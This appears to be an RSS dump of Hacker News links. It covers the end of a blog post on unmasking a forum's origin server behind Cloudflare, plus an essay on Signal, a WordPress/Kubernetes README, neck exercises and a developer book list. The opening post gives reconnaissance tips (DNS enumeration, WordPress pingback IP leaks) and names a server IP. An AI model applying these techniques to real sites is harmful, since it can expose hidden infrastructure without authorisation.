<p>DNS enumeration (via @JoshFarwell):</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">DNS enumeration is also your friend. The main DNS record might point to cloudflare but there may be other domain names that point directly to the origin. Dev versions of the site, etc</p>— ジョシュさん (@JoshFarwell) <a href="https://twitter.com/JoshFarwell/status/1347840751720304641?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote></div>
</div></figure>



<p>If the site in question is running WordPress, you <a href="https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/">can use Pingbacks to get WordPress to cough up the server IP address</a>. If you aren’t sure if something runs WordPress, here’s the lazy way to detect that: view any page’s source code and see if the string <code>/wp-content</code> shows up in any URLs (especially for CSS). If it’s found, you’re probably dealing with WordPress.</p>



<p>Gab’s (another platform favored by right-wing extremists) IP address discovered through their Image Proxy feature to be <code>216.66.0.222</code> (via @kubeworm):</p>



<figure><div>

</div></figure>



<h2 id="noticed">The Alt-Right Notices this Blog Post</h2>



<p>Shortly after I posted this online, some users from thedonald.win noticed this blog post and hilarity ensued.</p>



<figure><div>

</div><figcaption>The <a href="https://twitter.com/SoatokDhole/status/1348204577154326528">entire Twitter thread</a> is worth a read.</figcaption></figure>



<p>I want to make something clear in case anyone (especially members of toxic Trump-supporting communities) is confused:</p>



<p>What’s published on this page <em>isn’t</em> doxing, nor do I have any interest in doxing people. That’s the job of law enforcement, not furry bloggers who sometimes write about computer topics. And law enforcement definitely doesn’t need my help: When you create an account, you must solve a ReCAPTCHA challenge, which sends an HTTP request directly to Google servers–which means law enforcement could just subpoena Google for the IP address of the server, even if the above leaks were all patched.</p>



<p>This also isn’t the sort of thing I’d ever <em>brag</em> about, since the entire point I’ve been making is <strong>what I’ve done here isn’t technically challenging</strong>. If I wanted to /flex, I’d just talk more about my work on <a href="https://github.com/soatok/constant-time-js">constant-time algorithm implementations</a>.</p>



<p>If, in response to my abuse report, OVH Canada determines that their website isn’t violating OVH’s terms of service, then y’all have nothing to worry about.</p>



<p>But given the amount of rampant hate speech being hosted in Canadian jurisdiction, I wouldn’t make that bet.</p>



<hr>



<p>Header art by <a href="https://twitter.com/kazunekomori">Kyume</a>.</p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://soatok.blog/2021/01/09/masks-off-for-thedonald-win/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25700030</guid>
            <pubDate>Sat, 09 Jan 2021 13:02:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Authoritarianism Through Coding: Signal]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25699993">thread link</a>) | @m3rcury
<br/>
January 9, 2021 | https://www.oyd.org.tr/en/articles/signal/ | <a href="https://web.archive.org/web/*/https://www.oyd.org.tr/en/articles/signal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  <article>
    
     
      
    <p>This isn’t a theoretical piece about freedom and digital technologies. This is a real ongoing trend that is at best observed around secure messaging application Signal by Open Whisper Systems and it’s founder Moxie Merlinspike. His view and management of Signal reflects a wider trend that jepordises world’s freedom.</p>
<p>Signal is a secure messaging software that has changed the field a lot. Signal is built upon propriety software Textsecure and RedPhone applications that had been developed by Merlinspike and his co-founder Stuart Anderson. When Twitter acquired Whisper Systems, it releases both software under free software licenses. Merlinspike left Twitter acquired Whisper Systems, founded Open Whisper Systems and merged -once the private property of himself- TextSecure and Redphone into Signal.</p>
<p>Signal is free software. “Free as in freedom”, their client and server code is licenced under GPLv3 and AGPLv3. This makes the code and only the code itself pro-freedom. Just because the code it self free does not necessarily make the coder “free” as well and that is the problem we face today!</p>
<p>Open Whisper Systems led by Moxie Merlinspike, who is behind Signal, is and was never behind freedom. This has been seen in the light of LibreSignal (<a href="https://github.com/LibreSignal/LibreSignal/issues/37#issuecomment-217211165">https://github.com/LibreSignal/LibreSignal/issues/37#issuecomment-217211165</a>) debate where a fork of Signal client is build without unfree dependencies and published on the F-droid free software repository on Android. After much debate about federation, the claimed server resources and freedom, followed by legal trademark threats Libresignal has been removed from F-droid and so was anybody’s chance of using Signal as a secure messenger who doesn’t use Google services. <a href="https://wire.com/en/blog/axolotl-proteus-encryption-protocols/">Wire</a> case is just another example.</p>
<p>This approach is not only a threat to free software it is a recurring threat to human kind!</p>
<p>To prove this bold claim one needs to look at one recent blog post from Open Whisper Systems and a presentation made in 36C3 by Merlinspike.</p>
<p><a href="https://signal.org/blog/the-ecosystem-is-moving/">Signal’s blog post</a>
<a href="https://matrix.org/blog/2020/01/02/on-privacy-versus-freedom/">Matrix’s blog Post</a></p>
<p>The main points of his claims can be listed as follows:</p>
<ul>
<li>Decentralized systems are harder to build</li>
<li>Decentralized systems are harder to evolve</li>
<li>Decentralized systems are harder to secure</li>
<li>Decentralized systems are becoming concentrated in predominant provider anyways</li>
<li>If users don’t trust their app provider they have the freedom to use something else</li>
</ul>
<p>While his claims are true up to a certain point they are only superficial. Through these points Merlinspike claims that, centralized services are superior in modern times!</p>
<p><a href="https://matrix.org/blog/2020/01/02/on-privacy-versus-freedom/">anyone who is interested in the depth of this debate can start reading Martix’s answer to Merlinspike at the link here</a></p>
<p>It is really unnecessary to explain in depth why this type of thinking is dangerous when a simple change in words can tell more than 1000 page work. Let’s rename the object and compare his digital dystopia with one that has occured several times through-out analog human history and which once again recures today;</p>
<ul>
<li>Democracies are harder to build</li>
<li>Democracies are harder to improve</li>
<li>Democracies are harder to secure</li>
<li>In democracies power is becoming concentrated in predominant hands anyways</li>
<li>If people do not like their democracy provider (country) they have the freedom to leave and go another provider.</li>
</ul>
<p>One doesn’t need to think hard to see what Merlinspike is advising. He claims democracies suck because of the hardships of human organization and proposes autocracy to manage the world in favour of the helpless people occupying it. Why? Because democracies are inefficient and people don’t want that!</p>
<p>If he had given the same statement about democracies and governmental politics as he gave about federative systems it would have provoked outrage! People died for freedom, they are still dying and struggling around the globe. Then someone comes and stomps over every ideal which human society ever build up until this point in history and proclaims themselves the world leader! Think about it!</p>
<p>The example given is bad but why are Merlinspike’s claims about decentralized systems not considered bad as well? Because digital freedom has not yet been lost and won by blood or are we still asleep? Just because code is free, it doesn’t necessarily mean that the coders mind is also free! Freedom is not just a license, it is an ideal in any condition that we must stand for!</p>

    
        <hr>



    
  </article>
  
</div></div>]]>
            </description>
            <link>https://www.oyd.org.tr/en/articles/signal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699993</guid>
            <pubDate>Sat, 09 Jan 2021 12:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell is a Bad Programming Language (2020)]]>
            </title>
            <description>
<![CDATA[
Score 331 | Comments 286 (<a href="https://news.ycombinator.com/item?id=25699574">thread link</a>) | @fpoling
<br/>
January 9, 2021 | https://blog.shitiomatic.tech/post/haskell-is-a-bad-programming-language/#👾 | <a href="https://web.archive.org/web/*/https://blog.shitiomatic.tech/post/haskell-is-a-bad-programming-language/#👾">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://blog.shitiomatic.tech/post/haskell-is-a-bad-programming-language/#👾</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699574</guid>
            <pubDate>Sat, 09 Jan 2021 11:40:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Source for Helm chart that uses Ansible to set up a hardened WordPress]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25699544">thread link</a>) | @jhabdas
<br/>
January 9, 2021 | https://code.habd.as/comfusion/WordPress | <a href="https://web.archive.org/web/*/https://code.habd.as/comfusion/WordPress">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="count_prompt">You can not select more than 25 topics</span>
			<span id="format_prompt">Topics must start with a letter or number, can include dashes ('-') and can be up to 35 characters long.</span>
		</p><div>
	
	<div>
		<div>
			
				
<p>This is a WordPress repository configured to run on the <a href="https://kubernetes.io/" rel="nofollow">Kubernetes platform</a>. It's a fork of Pantheon's WordPress fork modified to remove the Pantheon-specific source code. Use it as a base for a hardened WordPress installation created via Ansible using <a href="https://code.habd.as/mirrors/wordpress-helm" rel="nofollow">wordpress-helm</a>.</p>
<p>Pantheon is a website platform optimized and configured to run high performance sites and then ransom those sites back to their customers when traffic rises due to popularity. This fork is intended to empower Pantheon <a href="https://www.chicagoganghistory.com/announcements/im-back/" rel="nofollow">customers stuck with a ransom note</a> to self-host instead.</p>
<p><a href="https://code.habd.as/comfusion/WordPress/media/branch/default/grafana.png" rel="nofollow"><img src="https://code.habd.as/comfusion/WordPress/media/branch/default/grafana.png" alt="grafana"></a></p>
<h2 id="user-content-comparisons">Comparisons</h2>
<p>Comparing Pantheon and Kubernetes.</p>
<h3 id="user-content-monthly-price">Monthly price</h3>
<p>Pantheon is a good value when visitor count is under 25K per month. After that value quickly diminishes:</p>
<table>
<thead>
<tr>
<th>Monthly Visitors</th>
<th>Pantheon</th>
<th>Kubernetes</th>
</tr>
</thead>
<tbody>
<tr>
<td>25K–50K</td>
<td>$160†</td>
<td>$30‡</td>
</tr>
<tr>
<td>50K–150K</td>
<td>$275†</td>
<td>$30‡</td>
</tr>
<tr>
<td>150K–300K</td>
<td>$550†</td>
<td>Unknown</td>
</tr>
<tr>
<td>300K+</td>
<td>$916†</td>
<td>Unknown</td>
</tr>
</tbody>
</table>
<p>† Pantheon offers preferred pricing when paid annually. The charges are $114, $206, $412 and $687 respectively.</p>
<p>‡ Beware of monthly bandwidth limitations imposed by cloud-hosting providers such as <a href="https://habd.as/go/digitalocean" rel="nofollow">DigitalOcean</a> and <a href="https://habd.as/go/vultr" rel="nofollow">Vultr</a>. Some providers offer unlimited bandwidth while others do not. Choosing the right one for you will depend on your specific requirements.</p>
<h3 id="user-content-features">Features</h3>
<p>Comparison of features between Pantheon starter plan and wordpress-helm:</p>
<table>
<thead>
<tr>
<th>Pantheon</th>
<th>Kubernetes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Varnish</td>
<td>—</td>
</tr>
<tr>
<td>–</td>
<td>Redis</td>
</tr>
<tr>
<td>Apache Solr</td>
<td>—</td>
</tr>
<tr>
<td>Nginx</td>
<td>Apache</td>
</tr>
<tr>
<td>PHP-FPM</td>
<td>PHP Redis</td>
</tr>
<tr>
<td>MySQL</td>
<td>MariaDB (Replicated)</td>
</tr>
<tr>
<td>PhantomJS</td>
<td>—</td>
</tr>
<tr>
<td>—</td>
<td>Ansible</td>
</tr>
<tr>
<td>WP Cron</td>
<td>K8s CronJob + MU Cron</td>
</tr>
<tr>
<td>WP Mail</td>
<td>—</td>
</tr>
<tr>
<td>Easy backups</td>
<td>Backups automated</td>
</tr>
<tr>
<td>Drush API</td>
<td>Root shell</td>
</tr>
</tbody>
</table>
<p>As you can see you need to give up some things in order to migrate to Kubernetes. What you lose you gain back in the form of control. Items may be added to or removed from the stack as needed.</p>
<h2 id="user-content-getting-started">Getting Started</h2>
<h3 id="user-content-1-spin-up-a-free-site-on-pantheon">1. Spin-up a free site on Pantheon</h3>
<p>If you do not yet have a Pantheon account, you can create one for free. Once you've verified your email address, you will be able to add sites from your dashboard. Choose "WordPress" to use the upstream distribution of this fork.</p>
<h3 id="user-content-2-load-up-the-site">2. Load up the site</h3>
<p>When the spin-up process is complete, you will be redirected to the site's dashboard. Click on the link under the site's name to access the Dev environment.</p>
<h3 id="user-content-3-run-the-wordpress-installer">3. Run the WordPress installer</h3>
<p>How about the WordPress database config screen? No need to worry about database connection information as that is taken care of in the background. The only step that you need to complete is the site information and the installation process will be complete.</p>
<h3 id="user-content-4-wait-for-ransom-note">4. Wait for ransom note</h3>
<p>Pantheon has a tendency to change their pricing model every couple of years. When you eventually get a ransom note after getting backed into a corner begin your migration to Kubernetes.</p>
<h3 id="user-content-5-begin-migration-to-kubernetes">5. Begin migration to Kubernetes</h3>
<p>The entire migration process should take about a week or so for an experienced developer. Full migration instructions <a href="https://habd.as/post/move-pantheon-wordpress-site-kubernetes/" rel="nofollow">are available</a> without fee.</p>
<h3 id="user-content-6-profit">6. Profit!</h3>
<p><a href="https://source.unsplash.com/rwfISioESQM" rel="nofollow"><img src="https://source.unsplash.com/rwfISioESQM" alt="profit"></a></p>

			
		</div>
	</div>
</div></div>]]>
            </description>
            <link>https://code.habd.as/comfusion/WordPress</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699544</guid>
            <pubDate>Sat, 09 Jan 2021 11:33:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep neck flexor exercises – Back and neck]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 110 (<a href="https://news.ycombinator.com/item?id=25699510">thread link</a>) | @whereistimbo
<br/>
January 9, 2021 | https://www.sprintphysio.co.uk/patient-exercises/back-and-neck/deep-neck-flexor-exercises.html | <a href="https://web.archive.org/web/*/https://www.sprintphysio.co.uk/patient-exercises/back-and-neck/deep-neck-flexor-exercises.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mainContent">
	<div>
        <div id="leftCol_normal">

<h2>Deep neck flexor exercises</h2>
<br>
<h3>Why train them?</h3>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_1.jpg"></p><p>The deep neck flexor muscles sit deep in the front of the neck, behind the trachea (windpipe). Because of their close proximity to the vertebrae (spine) and their short length, they have an important role in providing stability to the neck. People with a history of neck or upper back injury, such as whiplash, can show great improvement in pain and function if they strengthen these muscles. Those with postural neck pain often have weakness in these muscles and overuse in the muscles on the top of the shoulders. They too can show a great response to retraining the deep neck flexor muscle group.
</p><br>

<h3>How do I exercise them?</h3>
<h5>Exercise 1</h5>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_2.jpg"></p><ul>
<li>Lie on your back with knees comfortably bent. Find your neutral spine position, as explained by your physiotherapist. Use a small rolled towel under the head if needed.</li>
<li>Lift your head off the towel and feel the muscles on the front of the neck. These are NOT the deep neck flexor muscles - these muscles often overwork to try and help with stability, they are not designed for this purpose.</li>
<li>Perform a small nodding movement, as if to look towards your toes. Don't lift your head up. You should not feel the muscles on the front of the neck moving, but rather you should be using the muscles deep behind them.</li>
<li>Hold for 5 seconds. Repeat 10 times.</li>
</ul>
<h5>Exercise 2</h5>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_3.jpg"></p><ul>
<li>Position as above.</li>
<li>Place your hand on the side of your head and provide gentle resistance, as if you are bending your head to one side.</li>
<li>Hold for 5 seconds. Repeat 10 times.</li>
<li>Use hand to resist small rotation movement.</li>
<li>Hold for 5 seconds. Repeat 10 times.</li>
</ul>
<h5>Exercise 3</h5>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_4.jpg"></p><ul>
<li>Lie on your tummy with hands supporting the forehead.</li>
<li>Perform the small nodding movement and float the head and breastbone off the floor.</li>
<li>Hold for 5 seconds. Repeat 10 times.</li>
</ul>
<h5>Exercise 4a:</h5>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_5.jpg"></p><ul>
<li>Stand with your back to the wall and your feet slightly in front, hip width apart. Perform the small nodding movement, while sliding the base of the skull up the wall. You should feel the neck lengthen.</li>
<li>Hold for 5 seconds. Repeat 10 times.</li>
</ul>
<h5>Exercise 4b:</h5>

<ul>
<li>Same as exercise above.</li>
<li>From the lengthened position, move your head away from the wall so that you're looking at the floor.</li>
<li>Then return to the starting position.</li>
<li>Do not allow your chin to poke forward through either movement.</li>
</ul>

<h5>Exercise 4c:</h5>
<p>
<img src="https://www.sprintphysio.co.uk/images/patient-exercises/deep_neck_8.jpg"></p><ul>
<li>Sitting in a chair, look up at the ceiling.</li>
<li>When returning the head back to the neutral position, do not let the chin poke forward.</li>
<li>Curl forward one level at a time, starting from the top.</li>
<li>Do not allow your chin to poke forward.</li>
</ul>
<br>

<h3>Where do I go from here?</h3>
<p>
Once you have mastered these exercises, you should feel more aware of your neck posture and how to position yourself correctly. You can use this knowledge:</p>
<ul>
<li>When sitting at your desk/computer or on the couch.</li>
<li>Performing any weights in the gym or doing exercise classes.</li>
</ul>

<p>

Please <a href="https://www.sprintphysio.co.uk/contact-us/index.html">contact us</a> to book an appointment or for more information on any of the services available at our clinic in Kensington.</p>
<p>
<a href="#top" title="Back To Top">↑ Back To Top</a></p>






        </div>
        
		



				
				<p><b>Insurance providers...</b></p><p><img src="https://www.sprintphysio.co.uk/images/insurance-logos.png">
				</p>
				<br>


	</div>
</div><div id="jumpsContainer">
	<div>
			<div id="j1">
				<p><a>Physiotherapy</a></p><p><a href="https://www.sprintphysio.co.uk/services/physiotherapy.html"><img src="https://www.sprintphysio.co.uk/images/physiotherapy-jump.jpg" alt="Physiotherapy" title="Physiotherapy"></a></p>
				<div><p>
					Our physiotherapists specialise in restoring your normal function and movement patterns so you can get on with everyday life. </p></div>
				<p>Read more »</p>
			</div>
			<div id="j2">
 				<p><a>Pilates</a></p><p><a href="https://www.sprintphysio.co.uk/services/pilates.html"><img src="https://www.sprintphysio.co.uk/images/pilates-jump.jpg" alt="Pilates" title="Pilates"></a></p>
				<div><p>
					Pilates focuses on building the body???s core strength and improving posture through a series of low repetition, low impact stretching and conditioning exercises. </p></div>
				<p>Read more »</p>
			</div>

            <div id="j3">
            	<p><a>Sports injuries</a></p><p><a href="https://www.sprintphysio.co.uk/services/sports-assessments.html"><img src="https://www.sprintphysio.co.uk/images/sports-injuries-jump.jpg" alt="Sports injuries" title="Sports injuries"></a></p>
				<div><p>
					At Sprint Physiotherapy we are experts at treating a variety of sporting injuries, including; swimming, running, golfing, etc.</p></div>
				<p>Read more »</p>
			</div>

            <div id="j4">
				<p><a>Massage Therapy</a></p><p><a href="https://www.sprintphysio.co.uk/services/massage.html"><img src="https://www.sprintphysio.co.uk/images/massage-therapy-jump.jpg" alt="Massage Therapy" title="Massage Therapy"></a></p>
				<div><p>
					Our massage therapists specalise in a range of massage techniques; remedial, sports, pregnancy, etc.</p></div>
				<p>Read more »</p>
			</div>
			

	</div>
</div></div>]]>
            </description>
            <link>https://www.sprintphysio.co.uk/patient-exercises/back-and-neck/deep-neck-flexor-exercises.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699510</guid>
            <pubDate>Sat, 09 Jan 2021 11:27:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: DevBooks – Help Developers find indy books]]>
            </title>
            <description>
<![CDATA[
Score 113 | Comments 31 (<a href="https://news.ycombinator.com/item?id=25698707">thread link</a>) | @simon-holdorf
<br/>
January 9, 2021 | https://thesmartcoder.dev/books/ | <a href="https://web.archive.org/web/*/https://thesmartcoder.dev/books/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div data-app="true" id="app" data-v-8b44678a=""><div> <main data-v-8b44678a=""><div><div data-v-405cec28="" data-v-8b44678a=""><div><div data-v-405cec28=""><div data-v-405cec28=""><div> <p data-v-405cec28="">
        Find the best books for developers.
      </p></div></div></div></div></div> <div data-v-8b44678a=""><div data-v-58ecdbbb="" data-v-8b44678a=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><h2>What is DevBooks?</h2> <p>DevBooks helps developers to find the best books for developers and authors to showcase their amazing work. </p></div></div> </div> <div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div xs="12"><div> <div><h2>
        A React Developer’s Guide to Hooks
      </h2> <p>by Sebastien Castiel</p> <p>
        React Hooks are awesome, but they are not easy to use every day.
In my experience with React and hooks, I have faced a lot of issues, spent some time debugging to understand where these issues came fr...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Test Automation
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn the principles behind test-driven development (TDD) and behavior-driven development (BDD) and see how Jasmine, RSpec and Cucumber can be used to your advantage. This book examines some of the le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Jest Handbook
      </h2> <p>by Hugo Di Francesco</p> <p>
        Learn Advanced JavaScript Testing patterns with Jest.

Take your JavaScript testing to the next level by learning the ins and outs of Jest, the top JavaScript testing library.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Bootstrap
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn to use one of the most popular CSS frameworks and build mobile-friendly web pages. Used for numerous websites and applications, Bootstrap is a key tool for modern web development.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        The Coding Career Handbook
      </h2> <p>by Shawn Swyx Wang</p> <p>
        10 hours of audio. 40 chapters. 450+ pages. 1,400+ links to original sources curated over 3 years. Priceless insights from dozens of developers at the top of their fields. Proven ideas, tested by pers...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Tech Resume Inside Out
      </h2> <p>by Gergely Orosz</p> <p>
        What a good developer resume looks like, and how to write one. I've reviewed hundreds of developer resumes at tech companies like Microsoft, Skype, and Uber. This guide helps you craft a developer res...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Code Your Way Up
      </h2> <p>by Greg Thomas</p> <p>
        Code Your Way Up is the book for new developers looking to get started in software and asks the hard questions on growth, delivery, and initiative and what you need to think of in order to succeed.  I...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Lean from the Trenches
      </h2> <p>by Henrik Kniberg</p> <p>
        You know the Agile and Lean development buzzwords, you’ve read the books. But when systems need a serious overhaul, you need to see how it works in real life, with real situations and people. Lean fro...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How to Get a Job in Web Development
      </h2> <p>by RealToughCandy</p> <p>
        "How to Get a Job in Web Development" is designed for junior web developers. 
In this book, you will learn how to:

• Expertly craft the ‘holy clover’ of application materials: your resume, cover lett...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Master HTML &amp; CSS
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Want to become a Web developer? HTML and CSS are a must for your foundation. And this book takes you from zero to advanced level. From classical hello world things to how you can position elements on ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Letters To a New Developer
      </h2> <p>by Dan Moore</p> <p>
        Learn what you need to succeed as a developer beyond the code. The lessons in this book will supercharge your career by sharing lessons and mistakes from real developers. 

Wouldn’t it be nice to lear...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How To Host, Secure, and Deliver Static Websites on Amazon Web Services
      </h2> <p>by Kyle Galbraith</p> <p>
        "How To Host, Secure, and Deliver Static Websites on Amazon Web Services" is a book and video course that cuts through the sea of information to accelerate your learning of AWS. Giving you a learning ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to GraphQL
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to GraphQL is your personal journey to master pragmatic GraphQL in JavaScript. The book is full with applications you are going to build along the way with React.js and Node.js. Afterward, yo...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Portfolio Surgery
      </h2> <p>by RealToughCandy</p> <p>
         In Portfolio Surgery, you'll start with a massive upgrade of the look and feel of your portfolio. You'll learn about common pitfalls, dos and don'ts, and portfolio optimization techniques. Then, in t...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Pure React
      </h2> <p>by Dave Ceddia</p> <p>
        Learning new skills is one of the best ways to invest in yourself.

Knowing React can be the deciding factor in getting hired for a new job, or set you up for a promotion at your current one.

You cou...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Good Parts of AWS
      </h2> <p>by Daniel Vassallo</p> <p>
        This is a book by Daniel Vassallo and Josh Pschorr. Between us, we have worked with AWS for 15 years, including 11 years working inside AWS. We have worked on all sorts of web applications, from small...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Vavr
      </h2> <p>by Alexandre Grison</p> <p>
        Practical Vavr is all about making you want to use Vavr in your day to day Java programming.

If you want to improve the quality of your code by using a well-thought and beautifully designed functiona...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Your First Year in Code
      </h2> <p>by Isaac Lyman</p> <p>
        Starting a career in programming can be intimidating. Whether you're switching careers, joining a boot camp, starting a C.S. degree, or learning on your own, Your First Year in Code can help, with pra...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Building an Effective Dev Portfolio
      </h2> <p>by Josh Comeau</p> <p>
        I got so many replies! A couple hundred developers were willing to share their portfolios with me, and I went through as many as I could over the next couple of weeks. I found I kept giving the same f...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        PHP Mentors - Advice from PHP Experts around the world
      </h2> <p>by Flávio Silveira</p> <p>
        Answers from PHP masters around the world for your questions.
Code, Career, Team work, Working environment, Logs, Tests, Future and much more.

PHP Mentors Book is a set of questions with topics that ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Case of IBM 386 PC: A Detective Story for Techies
      </h2> <p>by Jim Grep</p> <p>
        Take a break, have some fun reading a tech mystery story on programming--a first of its kind. A nostalgic story from the early days of IBM PC when some programmers get together to play detective and h...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Freelance Newbie
      </h2> <p>by RealToughCandy</p> <p>
        Are you ready to jump-start your freelance web development career? Freelance Newbie has you covered! In this book, you’ll learn practical, actionable steps you can start using TODAY to get your first ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        14 Habits of Highly  Productive Developers
      </h2> <p>by Zeno Rocha</p> <p>
        You can learn the most popular frameworks, use the best programming languages, and work at the biggest tech companies, but if you cultivate bad habits, it will be hard for you to become a top develope...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Content for Developers
      </h2> <p>by Maedah Batool</p> <p>
        A whole new workflow to Write. Publish. Market. Authentic &amp; professional content writing meant for developers. Zero bull-shit and to-the-point tips to improve your technical content writing skills. Le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        A Smart Guide for Your Career as a Software Engineer
      </h2> <p>by Mike Nikles</p> <p>
        I started my software engineer career 20 years ago. Since then, I have interviewed hundreds of candidates and reviewed even more resumes. This book is a guide for your own career, whether you are new ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Outstanding Developer
      </h2> <p>by Sebastien Castiel</p> <p>
        Being a developer is not only about writing code. And improving as a developer is not only about improving in writing code. This book explores how to become an outstanding developer through several ax...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        5 Little Potions
      </h2> <p>by Mark Wilbur</p> <p>
        In 5 Little Potions, you'll begin your journey into Elixir programming by creating increasingly complex games.

You'll start with a simple guessing game. Next you'll work with Elixir Structs in a boar...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Distributed Systems with Node.js
      </h2> <p>by Thomas Hunter II</p> <p>
        In this hands-on guide, author Thomas Hunter II proves that Node.js is just as capable as traditional enterprise platforms for building services that are observable, scalable, and resilient. Intermedi...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Data Analysis with Rust Notebooks
      </h2> <p>by Dr. Shahin Rostami</p> <p>
        A practical book on Data Analysis with Rust Notebooks that teaches you the concepts and how they're implemented in practice.

- All code examples in Rust,
- Rust (Jupyter) Notebooks for each Section,
...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Python re(gex)?
      </h2> <p>by Sundeep Agarwal</p> <p>
        This book will help you learn Python Regular Expressions, a mini-programming language for all sorts of text processing needs.

The book heavily leans on examples to present features of regular express...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to React
      </h2> <p>by Robin Wieruch</p> <p>
        In "The Road to React" you will learn about all the fundamentals of React.js with Hooks while building a full-blown React application step by step. While you create the React application, every chapte...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Cloud Native Web Development
      </h2> <p>by Mike Nikles</p> <p>
        In this book, we will walk through the end-to-end process of developing a cloud-native web application. You will learn technologies, processes, tips &amp; tricks and gain hands-on experience. You will fin...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to Firebase
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to React with Firebase is your personal journey to master advanced React for business web applications in JavaScript whereas Firebase is used to replace everything that you would want from a ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Standout Developer
      </h2> <p>by Randall Kanna</p> <p>
        If you’re tired of the endless job search and feeling like your resume isn’t being seen, this book will help you craft a great resume that stands out and get it seen by the companies you want. I’ll sh...

 …</p></div></div></div></div></div></div></div></div></div></div></div></main></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesmartcoder.dev/books/">https://thesmartcoder.dev/books/</a></em></p>]]>
            </description>
            <link>https://thesmartcoder.dev/books/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25698707</guid>
            <pubDate>Sat, 09 Jan 2021 08:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Elixir's GenServer with a real-world example]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25698520">thread link</a>) | @kimi
<br/>
January 8, 2021 | https://papercups.io/blog/genserver | <a href="https://web.archive.org/web/*/https://papercups.io/blog/genserver">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://papercups.io/blog/genserver</link>
